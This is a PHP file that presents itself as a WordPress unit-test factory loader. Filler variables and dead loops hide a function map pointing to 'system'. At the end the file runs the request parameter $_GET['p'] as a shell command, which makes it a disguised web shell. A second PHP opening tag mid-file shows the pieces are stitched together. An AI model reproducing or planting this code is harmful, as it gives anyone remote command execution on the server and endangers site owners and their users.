<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

require_once __DIR__ . '/factory/class-wp-unittest-factory-for-thing.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-post.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-bookmark.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-attachment.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-user.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-comment.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-blog.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-network.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-for-term.php';
require_once __DIR__ . '/factory/class-wp-unittest-generator-sequence.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory-callback-after-create.php';
require_once __DIR__ . '/factory/class-wp-unittest-factory.php';

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>